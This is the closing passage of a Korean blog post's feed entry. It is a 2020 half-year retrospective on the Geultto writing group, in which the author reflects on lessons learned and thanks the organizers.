확인과 피드백 반영이 필요한 중장기 프로젝트였다-고 요약할 수 있겠다.</p> <p>다음에 또 기회가 된다면 이번 활동의 아쉬운 점들을 보완할 수 있는 구체적인 다짐글로부터 시작해야겠다 :) 수고해주신 성윤님과 운영진 분들께도 감사드립니다!</p>]]></content><author><name></name></author><category term="retrospective"/><category term="2020"/><category term="halfyear"/><category term="geultto"/><summary type="html"><![CDATA[글또가 남긴 것]]></summary></entry></feed>